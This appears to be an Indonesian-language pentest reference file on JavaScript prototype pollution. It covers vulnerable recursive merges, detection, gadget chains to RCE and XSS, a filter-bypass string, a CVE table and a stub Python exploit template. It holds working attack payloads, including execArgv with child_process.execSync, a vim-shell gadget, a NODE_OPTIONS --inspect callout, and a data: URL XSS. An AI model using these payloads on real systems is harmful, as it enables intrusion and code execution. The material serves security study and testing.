---
name: "Prototype Pollution"
description: "Client-side and server-side prototype pollution, vulnerable merge patterns, detection, server-side PP to RCE via gadget chaining, client-side PP to XSS, known CVEs, vulnerable library checks, and exploit templates."
tags: [oswe, prototype-pollution, javascript, nodejs, rce, xss, __proto__, gadget]
---

## Prototype Pollution

### What is Prototype Pollution?

Prototype Pollution adalah kerentanan JavaScript di mana attacker bisa memodifikasi `Object.prototype` (atau `__proto__`) untuk menginjeksi properti ke semua object dalam runtime. Ini terjadi ketika aplikasi melakukan **recursive merge** tanpa memeriksa `__proto__` key.

### Vulnerable Patterns

```javascript
// VULNERABLE merge function
function merge(a, b) {
    for (let key in b) {
        if (typeof b[key] === 'object' && b[key] !== null) {
            merge(a[key], b[key]);
        } else {
            a[key] = b[key];
        }
    }
}

// Input: {"__proto__": {"isAdmin": true}}
// Setelah merge, EVERY object has isAdmin = true
```

### Detection

```json
// Test payload
{"__proto__": {"test": 123}}

// Verifikasi — cek di browser console atau response behavior
// console.log({}.test) → 123 (if vulnerable)
```

### Server-Side Prototype Pollution → RCE

Polusi saja tidak mengeksekusi apa pun. Yang mengeksekusi adalah **gadget**: kode yang membaca opsi dari prototype. Gadget yang terdokumentasi (PortSwigger):

```javascript
// 1. execSync dengan shell + input → perintah dibaca dari prototype
//    {"__proto__":{"shell":"vim","input":":! id\n"}}  (vim/ex sebagai shell)

// 2. fork dengan execArgv
//    {"__proto__":{"execArgv":["--eval=require('child_process').execSync('id')"]}}

// 3. spawn dengan shell + NODE_OPTIONS
//    {"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=COLLAB"}}
```

Prasyarat: aplikasi memanggil `child_process` **setelah** polusi, memakai objek opsi yang tidak diisi eksplisit, pada proses Node yang sama. Tanpa itu, polusi hanya bertahan sampai proses mati.

### Client-Side Prototype Pollution → XSS

Gadget DOM juga harus ada: kode yang membaca properti dari objek hasil merge lalu menuliskannya ke sink.

```javascript
// transport_url → script.src (contoh gadget yang terdokumentasi)
// ?__proto__[transport_url]=data:,alert(1)//
```

`{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}` **tidak otomatis** menjadi XSS: harus ada kode yang menyalin properti itu ke `innerHTML`. Cari pasangan merge → sink di bundle, jangan berasumsi.

### Catatan parsing yang menentukan

- `JSON.parse` menyimpan `__proto__` sebagai **own property**; yang membuangnya adalah skema validasi, `qs` (`allowPrototypes:false`), atau body-parser — bukan JSON itu sendiri.
- `Object.assign` dangkal memakai `[[Set]]`, sehingga `Object.assign({}, JSON.parse('{"__proto__":{"x":1}}'))` hanya mengganti prototype objek target (lokal). Polusi global butuh rekursi, target berupa prototype, atau key `constructor` → `prototype`.
- Bypass filter sekali-jalan: `__pro__proto__to__` yang setelah `replace` menjadi `__proto__`; `--disable-proto=delete` masih bisa dilewati lewat `constructor.prototype`.

### CVE yang terverifikasi (NVD)

| CVE | Paket | Versi rentan | Fungsi | Dampak |
|---|---|---|---|---|
| CVE-2018-3721 | lodash | < 4.17.5 | `merge`, `mergeWith`, `defaultsDeep` | PP |
| CVE-2019-10744 | lodash | < 4.17.12 | `defaultsDeep` | PP (CVSS 9.1) |
| CVE-2020-8203 | lodash | < 4.17.20 | `zipObjectDeep` | PP |
| CVE-2019-11358 | jQuery | < 3.4.0 | `$.extend(true, ...)` | PP |
| CVE-2018-3750 | deep-extend | ≤ 0.5.0 | — | PP (9.8) |
| CVE-2019-10746 | mixin-deep | < 1.3.2, 2.0.0 | — | PP (9.8) |
| CVE-2021-23440 | set-value | < 2.0.1, ≥3.0.0 <4.0.1 | — | PP (9.8) |
| CVE-2021-44906 | minimist | ≤ 1.2.5 | `setKey` | PP (9.8) |
| CVE-2022-29078 | ejs | 3.1.6 | `outputFunctionName` | SSTI → RCE |
| CVE-2021-23369 | handlebars | < 4.7.7 | rantai konstruktor | RCE (**SSTI**, bukan PP) |

**Bukan prototype pollution:** CVE-2022-25883 adalah ReDoS pada `semver` (`new Range`), bukan PP. Jangan memasukkannya ke daftar ini.

### Library yang diperiksa

`lodash` (`merge`, `mergeWith`, `defaultsDeep`, `set`, `zipObjectDeep`), `jquery` (`$.extend(true, ...)`), `deep-extend`, `mixin-deep`, `set-value`, `minimist`, `merge-deep`, `merge-options`, `assign-deep`, `defaults-deep`, `just-extend`, `object-assign-deep`.

Daftar ini hanya kandidat; versi menentukan. `handlebars` dan `ejs` masuk kategori **SSTI**, bukan PP — bedakan agar laporan tidak salah kelas.

### Exploit Template (Server-Side PP)

```python
import requests, json

TARGET = "http://target/api/update"

# Phase 1: Test for PP
def test_pp():
    payload = {"__proto__": {"pp_test": "vulnerable"}}
    r = requests.post(TARGET, json=payload)

# Phase 2: Pollute + trigger gadget
def exploit():
    payload = {
        "__proto__": {
            "shell": True,
        }
    }
    r = requests.post(TARGET, json=payload)
    return r
```

## Best Practices

- Bedakan polusi, mass assignment, dan SSTI; ketiganya punya jalur mitigasi berbeda.
- Cari gadget sebelum mengklaim RCE: polusi tanpa gadget hanya mengubah state proses.
- Verifikasi versi paket sebelum mengutip CVE; satu CVE sering menempel pada fungsi tertentu.
- Uji non-destruktif lebih dulu (override status, header charset), baru gadget yang mengeksekusi.
- Tandai klaim versi yang belum dicek dengan [UNVERIFIED] dan jangan bawa ke laporan klien.
- Ingat polusi bertahan selama proses hidup; restart target menghapus bukti — ambil bukti saat masih berlaku.

## Rujukan

- [injection-attacks.md](./injection-attacks.md) — SSTI Handlebars dengan rantai konstruktor.
- [waf-bypass-payloads.md](./waf-bypass-payloads.md) — bila payload difilter WAF.
- PortSwigger: prototype pollution (client-side, server-side).
- NVD untuk setiap CVE yang dikutip.
